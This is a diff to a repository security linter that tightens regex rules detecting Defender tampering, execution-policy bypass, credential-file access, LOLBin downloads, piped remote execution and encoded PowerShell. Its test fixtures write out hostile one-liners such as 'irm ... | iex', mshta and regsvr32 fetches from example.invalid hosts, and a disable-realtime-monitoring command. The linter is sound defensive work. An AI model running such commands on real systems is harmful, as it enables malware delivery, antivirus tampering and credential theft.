@@ -118,7 +118,7 @@ _TAMPER = [
         (
             "Set",
             "-Mp",
-            r"Preference\b[^\n]*-Disable\w*(?!\s+\$false)(?:\s+\$true|\s+1\b|\s*$|\s+`)",
+            r"Preference\b[^\n]*-Disable\w*(?::\s*\$true|:\s*1\b|(?!\s+\$false)(?:\s+\$true|\s+1\b|\s*$|\s+`))",
         ),
         ("Add", "-Mp", r"Preference\b[^\n]*-Exclusion"),
     )
@@ -128,21 +128,28 @@ _BYPASS = _J((r"-Execution", r"Policy\s+", "(?:By", "pass|Unre", "stricted)"))
 _BYPASS_ARRAY = _J(
     (r"['\"]-Execution", r"Policy['\"]\s*,\s*['\"](?:By", "pass|Unre", r"stricted)['\"]")
 )
-_CRED_MARKERS = [
+# Product and profile names stay case-sensitive: "local state" and "local storage" are ordinary
+# prose in the frontend. File paths are matched in any case, as Windows resolves them.
+_CRED_NAMES = [
     _J(p)
     for p in (
         ("Login", " Data"),
         ("Local", " State"),
         ("Web", " Data"),
-        ("wallet", r"\.dat"),
         (r"\bElec", r"trum\b"),
         (r"\bExo", r"dus\b"),
         ("Meta", "Mask"),
         (r"\bt", r"data\b"),
+        ("Local", " Storage"),
+    )
+]
+_CRED_MARKERS = [
+    _J(p)
+    for p in (
+        ("wallet", r"\.dat"),
         (r"\bid_", r"(?:rsa|ed25519|ecdsa)\b"),
         ("key4", r"\.db"),
         ("logins", r"\.json"),
-        ("Local", " Storage"),
         (r"\.git-", "credentials"),
         ("/etc/", "shadow"),
         (r"\.(?:bit", "coin|ethe", "reum|sol", "ana|mon", r"ero)[/\\][A-Za-z_]{3,}"),
@@ -172,8 +179,8 @@ _LOLBIN = [
     for p in (
         (r"\bcert", r"util(?:\.exe)?\s+[^\n]*-(?:url", "cache|de", "code)"),
         (r"\bbits", r"admin(?:\.exe)?\s+/trans", "fer"),
-        (r"\bms", r"hta(?:\.exe)?\s+(?:https?|vb", "script|java", "script):"),
-        (r"\bregsvr", r"32(?:\.exe)?\s+[^\n]*/i:\s*https?:"),
+        (r"\bms", r"hta(?:\.exe)?\s+['\"]?(?:https?|vb", "script|java", "script):"),
+        (r"\bregsvr", r"32(?:\.exe)?\s+[^\n]*/i:\s*['\"]?https?:"),
         (r"\brun", r"dll32(?:\.exe)?\s+java", "script:"),
     )
 ]
@@ -260,9 +267,9 @@ def _check_hidden_bypass(path, lines, text):
 
 
 def _check_credentials(path, lines, text):
-    if not re.search(_ENV_ACCESS, text) or not re.search(_NETWORK, text):
+    if not re.search(_ENV_ACCESS, text, re.I) or not re.search(_NETWORK, text, re.I):
         return []
-    markers = [re.compile(m) for m in _CRED_MARKERS]
+    markers = [re.compile(m) for m in _CRED_NAMES] + [re.compile(m, re.I) for m in _CRED_MARKERS]
     present = {m.pattern for m in markers if m.search(text)}
     if not present:
         return []
@@ -289,7 +296,8 @@ def _check_system_copy(path, lines, text):
         )
         if not is_copy:
             continue
-        near = [x for x in _window(lines, i, 12) if not _is_comment(x)]
+        # The source may sit on the lines after a call split across several.
+        near = [x for x in _window(lines, i, 12, 3) if not _is_comment(x)]
         if any(sysdir.search(x) for x in near):
             out.append((i + 1, "error"))
     if path.endswith(".py"):
@@ -354,19 +362,28 @@ _FIRST_PARTY = re.compile(
 )
 
 
+def _inside_literal(line: str, position: int) -> bool:
+    """Whether `position` falls inside a quoted string or backtick span on this line."""
+    return any(line[:position].count(quote) % 2 for quote in ('"', "'", "`"))
+
+
 def _check_remote_exec(path, lines, text):
-    piped = re.compile(r"(?i)(https?://[^\s|'\"`]+|\)|\$[\w:]+)\s*\|\s*" + _IEX + r"\b")
+    piped = re.compile(r"(?i)(https?://[^\s|'\"`]+|\)|\$[\w:]+)['\"]?\s*(\|)\s*" + _IEX + r"\b")
     wrapped = re.compile(r"(?i)\b" + _IEX + r"\s*\(+\s*" + _DOWNLOADERS)
     out = []
     for i, line in enumerate(lines):
+        # Only our own one-liner is excused, and only where it is text: a comment, or a
+        # string that prints or quotes it. Executed, it is the same shape as anyone else's.
+        quoted_doc = _is_comment(line)
         hit = False
         for match in piped.finditer(line):
-            if not (
-                match.group(1).lower().startswith("http") and _FIRST_PARTY.match(match.group(1))
-            ):
+            ours = _FIRST_PARTY.match(match.group(1)) is not None
+            if not (ours and (quoted_doc or _inside_literal(line, match.start(2)))):
                 hit = True
-        if not hit and wrapped.search(line) and not _FIRST_PARTY.search(line):
-            hit = True
+        for match in wrapped.finditer(line):
+            ours = _FIRST_PARTY.search(line) is not None
+            if not (ours and (quoted_doc or _inside_literal(line, match.start()))):
+                hit = True
         if hit:
             out.append((i + 1, "error"))
     return out
@@ -442,7 +459,7 @@ RULES = [
         applies = lambda p: p.endswith(LAUNCHERS),
         line_patterns = [
             r"(?i)" + _ENC_CMD + r"\b",
-            r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]*\s-e(?:c|nc|ncodedcommand)?\s+[A-Za-z0-9+/=]{16,}",
+            r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]*\s-e(?:c|nc|ncodedcommand)?[\s:]+['\"]?[A-Za-z0-9+/=]{16,}",
             _FROM_B64,
             r"(?i)\bbase64\s+(?:-d|--decode)\b[^\n]*\|",
         ],
@@ -602,7 +619,8 @@ RULES = [
     ),
 ]
 RULES_BY_ID = {rule.id: rule for rule in RULES}
-_COMPILED = {rule.id: [re.compile(p) for p in rule.line_patterns] for rule in RULES}
+# PowerShell resolves commands, members and parameters in any case, and so do Windows paths.
+_COMPILED = {rule.id: [re.compile(p, re.I) for p in rule.line_patterns] for rule in RULES}
 
 
 def scan_text(relative: str, text: str) -> list[Finding]:
@@ -610,14 +628,16 @@ def scan_text(relative: str, text: str) -> list[Finding]:
     lower = text.lower()
     shipped = relative in SHIPPED_INSTALLERS
     found = []
+    # A .PS1 runs exactly like a .ps1, so rules see the lower-cased name.
+    folded = relative.lower()
     for rule in RULES:
-        if not rule.applies(relative):
+        if not rule.applies(folded):
             continue
         if rule.needles and not any(n in lower for n in rule.needles):
             continue
         hits: list[tuple[int, str]] = []
         if rule.check is not None:
-            hits = rule.check(relative, lines, text)
+            hits = rule.check(folded, lines, text)
         else:
             patterns = _COMPILED[rule.id]
             if not any(p.search(text) for p in patterns):
@@ -646,7 +666,8 @@ def _tracked_files() -> list[str]:
 
 
 def _in_scope(relative: str) -> bool:
-    if not relative.endswith(SUFFIXES) or relative.endswith(".min.js"):
+    folded = relative.lower()
+    if not folded.endswith(SUFFIXES) or folded.endswith(".min.js"):
         return False
     if EXCLUDED_PARTS & set(relative.split("/")[:-1]) or relative.startswith(EXCLUDED_PREFIXES):
         return False
@@ -654,11 +675,24 @@ def _in_scope(relative: str) -> bool:
     return relative not in ("scripts/lint_av_shapes.py", "tests/security/test_lint_av_shapes.py")
 
 
+def _read(path: Path) -> str:
+    """Decode the way PowerShell does: honour a BOM, and spot BOM-less UTF-16 by its NULs."""
+    raw = path.read_bytes()
+    if raw.startswith((b"\xff\xfe", b"\xfe\xff")):
+        return raw.decode("utf-16", errors = "replace")
+    if raw.startswith(b"\xef\xbb\xbf"):
+        return raw[3:].decode("utf-8", errors = "replace")
+    head = raw[:512]
+    if len(head) >= 16 and head[1::2].count(0) > len(head) // 4:
+        return raw.decode("utf-16-le", errors = "replace")
+    return raw.decode("utf-8", errors = "replace")
+
+
 def _scan_one(relative: str) -> list[Finding]:
     path = REPO_ROOT / relative
     if not path.is_file() or path.stat().st_size > MAX_BYTES:
         return []
-    return scan_text(relative, path.read_text(encoding = "utf-8", errors = "replace"))
+    return scan_text(relative, _read(path))
 
 
 def collect(paths: list[str] | None) -> list[Finding]:
@@ -673,7 +707,7 @@ def collect(paths: list[str] | None) -> list[Finding]:
                 relative = path.resolve().relative_to(REPO_ROOT).as_posix()
             except ValueError:
                 relative = path.as_posix()
-            found.extend(scan_text(relative, path.read_text(encoding = "utf-8", errors = "replace")))
+            found.extend(scan_text(relative, _read(path)))
         return found
     candidates = [f for f in _tracked_files() if _in_scope(f)]
     # About 6000 files and 115 MB: one process per core keeps the whole-repo run to a few seconds.
@@ -698,15 +732,20 @@ def _load_baseline() -> dict:
     return json.loads(BASELINE_PATH.read_text(encoding = "utf-8"))
 
 
-def _allowed(document: dict) -> tuple[dict, dict]:
-    """Baseline groups are one reason per (file, rule) with digest -> count underneath."""
-    allowed, reasons = {}, {}
+def _allowed(document: dict) -> tuple[dict, dict, set]:
+    """Baseline groups: one reason per (file, rule), digest -> count underneath.
+
+    Returns the allowed counts, every group's reason, and the groups recorded as errors.
+    """
+    allowed, reasons, error_groups = {}, {}, set()
     for group in document.get("groups", []):
+        key = (group["file"], group["rule"])
+        reasons[key] = group.get("reason", "")
         if group.get("severity") == "error":
-            reasons[(group["file"], group["rule"])] = group.get("reason", "")
+            error_groups.add(key)
         for digest, count in group["digests"].items():
             allowed[(group["file"], group["rule"], digest)] = count
-    return allowed, reasons
+    return allowed, reasons, error_groups
 
 
 def _explain(f: Finding) -> str:
@@ -742,8 +781,13 @@ def main() -> int:
         print(f"internal error: {error}")
         return 2
     document = _load_baseline()
-    allowed, reasons = _allowed(document)
+    allowed, reasons, error_groups = _allowed(document)
     observed = _counted(findings)
+    # Severity comes from what the lint sees now, not from the JSON, which is hand-edited.
+    observed_errors = {(f.file, f.rule, f.digest) for f in findings if f.severity == "error"}
+    error_groups |= {
+        (file, rule) for file, rule, _ in observed_errors if (file, rule, _) in allowed
+    }
 
     if arguments.update:
         severities = {
@@ -805,23 +849,24 @@ def main() -> int:
 
     if not arguments.paths:
         unreviewed = sorted(
-            (file, rule)
-            for (file, rule), reason in reasons.items()
-            if not reason or reason == "REVIEW ME"
+            key
+            for key in error_groups
+            if not reasons.get(key) or reasons[key] in ("REVIEW ME", "pre-existing warning")
         )
         if unreviewed:
             print(f"{len(unreviewed)} baseline group(s) for error rules carry no reason:")
             for file, rule in unreviewed:
                 print(f"  {file}  {rule}")
             problems = 1
+        # Fewer occurrences than recorded is stale too: the spare count would let a copy back in.
         stale = sorted(
-            k
-            for k in allowed
-            if k not in observed and RULES_BY_ID.get(k[1]) and RULES_BY_ID[k[1]].severity == "error"
+            k for k in allowed if (k[0], k[1]) in error_groups and observed.get(k, 0) < allowed[k]
         )
         if stale:
             # An entry that outlives its line would quietly re-permit whatever lands on that digest next.
-            print(f"{len(stale)} baseline entr(y/ies) no longer match anything. Run --update:")
+            print(
+                f"{len(stale)} baseline entr(y/ies) allow more than the code still has. Run --update:"
+            )
             for file, rule, digest in stale:
                 print(f"  {file}  {rule}  {digest}")
             problems = 1
@@ -937,6 +982,56 @@ def _fixtures() -> list[tuple[str, str, str, bool]]:
         ("AV014", "install.ps1", "# resolves the venv python before the first pip call", False),
         ("AV015", "t.ps1", "$sb = [scriptblock]::Create($text)", True),
         ("AV015", "t.ps1", ". $PSScriptRoot/helpers.ps1", False),
+        # Spellings PowerShell accepts that a first cut of these rules missed.
+        (
+            "AV002",
+            "t.ps1",
+            "$p = " + _J(("virtual", "allocEx")) + "($h, 0, 4096, 0x3000, 0x40)",
+            True,
+        ),
+        (
+            "AV003",
+            "t.ps1",
+            "$a = $d." + _J(("define", "dynamic", "assembly")) + "($n, 'Run')",
+            True,
+        ),
+        ("AV004", "t.ps1", "powershell -enc " + q + "ZQBjAGgAbwAgAGgAaQA=" + q, True),
+        ("AV005", "t.ps1", "irm 'https://example.invalid/x.ps1' | " + _J(("i", "ex")), True),
+        ("AV005", "t.ps1", "irm https://unsloth.ai/install.ps1 | " + _J(("i", "ex")), True),
+        (
+            "AV005",
+            "t.ps1",
+            "Write-Host 'irm https://unsloth.ai/install.ps1 | " + _J(("i", "ex")) + "'",
+            False,
+        ),
+        (
+            "AV006",
+            "t.ps1",
+            _J(("Set", "-Mp", "Preference")) + " -Disable" + "RealtimeMonitoring:$true",
+            True,
+        ),
+        (
+            "AV008",
+            "s.ps1",
+            "$h = $ENV:APPDATA\nINVOKE-WebRequest $u\n$a = 'WALLET"
+            + ".DAT'\n$b = '"
+            + _J(("ID_", "RSA"))
+            + "'\n",
+            True,
+        ),
+        (
+            "AV009",
+            "t.py",
+            "shutil.copy2(\n    Path(os.environ['SystemRoot']) / 'System32' / 'where.exe',\n    tmp / 'llama-server.exe',\n)\n",
+            True,
+        ),
+        ("AV011", "t.bat", "mshta " + q + "https://example.invalid/a.hta" + q, True),
+        (
+            "AV011",
+            "t.bat",
+            "regsvr32 /s /i:" + q + "https://example.invalid/a.sct" + q + " scrobj.dll",
+            True,
+        ),
         # Suppression is honoured outside the shipped installers and ignored inside them.
         (
             "AV015",
